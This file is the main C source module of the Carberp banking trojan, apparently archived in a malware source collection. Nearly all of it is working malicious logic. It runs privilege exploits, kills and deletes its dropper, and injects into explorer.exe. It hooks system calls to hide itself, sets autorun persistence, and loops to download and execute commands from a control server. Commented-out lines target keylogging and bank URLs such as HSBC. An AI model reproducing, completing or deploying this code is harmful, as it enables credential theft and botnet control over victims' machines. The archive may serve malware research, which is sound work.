/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "DllLoader.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Grabber.h"
#include "Config.h"
#include "Crypt.h"
#include "FtpSniffer.h"
#include "AvBlock.h"
#include "ntdll.h"
#include "BotDebug.h"
#include "BotEvents.h"
#include "Task.h"
#include "md5.h"

#include "Modules.h"


#pragma comment(linker, "/ENTRY:MyMain" )


WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������
WCHAR FileToDelete[ MAX_PATH ]; //���� ��� �������� ��������������� ����� ����

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
//DWORD dwExplorerPid  = 0; //��� ����������

//�������� ��� ����������

void DeleteDropper() // ������� �������, ������� ����
{
	if ( dwKillPid != 0 && m_wcslen( FileToDelete ) > 0 )
	{
		pWinStationTerminateProcess( NULL, dwKillPid , DBG_TERMINATE_PROCESS );	
		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
		pDeleteFileW( FileToDelete );
	}
}


bool SendInfo()
{
	bool Ret = SendFirstInfo();
	return Ret;
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	
	

	UnhookDlls();
	ProtectBot();

	
	
	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		// ������� ������� svchost
		pExitProcess(1);
		return 0; // ��� �����������
	}

	bool FirstSended = false;
	

	PTaskManager Tasks = NULL;
	if (InitializeTaskManager(&Tasks))
	{
		RegisterAllCommands(Tasks, COMMAND_ALL);
		PCHAR URL;
		while (true)
		{
			URL = GetBotScriptURL(ScriptTask);

			// ��������� � ��������� �������

			DownloadAndExecuteCommand(Tasks, URL);
			STR::Free(URL);

			// "������������" �������������� ����������� ���� � ��� �������
			// �������� ��������� ���������� ������ ���� ������ ����� ���������
			// �������
			if (!FirstSended)
				FirstSended = SendInfo();
			
			//������ ��������(�������� ��� , ������ � �������� ��)
			#ifdef imbiciliH
			URL = GetBotScriptURL(ScriptPlugins);
			ReportToPlugin(URL);
            StrFree(URL);
			#endif
			
//��������  ��������� ������ ��������� � �������� ��� ����� ��������� � ����� �� � ����



			// ���������������� ���������� ������
			if (!TaskManagerSleep(Tasks))
				break;
		}

    }

	// ���� ���������� ������� ��������� ������ ��
	// ������� �������
	pExitProcess(1);

	return 0;
}


void ExplorerMain()
{
	if ( !dwExplorerSelf )
		UnhookDlls();

	if ( m_wcslen( TempFileName ) > 0 )
	{
		#ifndef DEBUGBOT
			AddToAutoRun( TempFileName );
		#endif
	}

	DeleteDropper();

	HookZwResumeThread();
	HookZwQueryDirectoryFile();
	
	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );

	if ( dwFirst && !dwGrabberRun )
		MegaJump( GrabberThread );


	//MegaJump(AvFuckThread);


	// �������� ������� ������ ����������

	if (dwFirst)
		ExplorerFirstStart(NULL);

	ExplorerStart(NULL);

}

DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	UnhookDlls();

	if ( dwExplorerSelf ) //���� ������ ��� � ���� ��������� �����������
	{
		dwExplorerSelf = 0;

		if ( !InjectIntoExplorer( ExplorerRoutine ) )
		{
			ExplorerMain();
		}

		pExitProcess( 1 );
	}

	ExplorerMain();
	
	return 0;
}

DWORD LiteCrypt( int Key, LPBYTE lpResult, DWORD dwSize )
{
    DWORD a = 0, b = 0;
    a = 0;
	
    while ( a < dwSize )
    {
        lpResult[ a ] ^= Key; 
        a++; 
    }

	return a;
}

int APIENTRY MyMain() 
{
//Hunting();
//IsKeyLoggerProcess();	
	//SetScreensThread( "C:\\Documents and Settings\\Nicolay_\\Application Data\\KYL\\1.jpg" );
//	ReadOpenDirectory(0x001a,L"KYL\\", L"*.dats");
//	DataGrabber::SendDataFile("C:\\Documents and Settings\\Nicolay_\\Application Data\\Dat81.tmp.xsi");
//	IsKeyLoggerProcess();
//	 SendLoadedFiles();
	//IsKeyLoggerProcess();
//	Hunting();
	//SendLoadedFiles();
	//ReadOpenDirectory(0x001a,L"KYL\\", L"*.dat");
	//Hunting();
//	SendLoadedFiles();
//	IsKeyLoggerProcess();
//	Hunting();
/*	IsBankHunter( "https://www.business.hsbc.co.uk/1/2/" );
Hunting()	;
/*
	RunHuntThred(NULL);*/
 /*CompareUrl( "https://www.hsbc.co.uk/1/2/*authent", "https://www.hsbc.co.uk/1/2/5555555authent" );*/
//	pSleep(1000*10*60*10); 
//return 0;
	#ifdef DEBUGBOT
		if (!StartInDebugingMode(true))
			return 0;
	#endif

	UnhookDlls(); //������� ����

	WCHAR ModulePath[ MAX_PATH ];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	if ( dwProcessHash == GetBotHash() ) // ������ �� ������ ����
	{
		KillOutpost();
		DWORD dwExploits = DoExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		dwFirst = 1;

		KillOutpost();
		DWORD dwExploits = DoExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}

			if ( MegaJump( GrabberThread ) )
			{
				dwGrabberRun = 1;
			}
		}
				
		m_wcsncpy( FileToDelete, ModulePath, m_wcslen( ModulePath ) );
		dwKillPid = (DWORD)pGetCurrentProcessId();
		CopyFileToTemp( ModulePath, TempFileName );	

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) )
			{
				#ifndef DEBUGBOT
				AddToAutoRun( ModulePath );
				#endif
			}
		}
	}

	pExitProcess( 1 );

	return 0;
}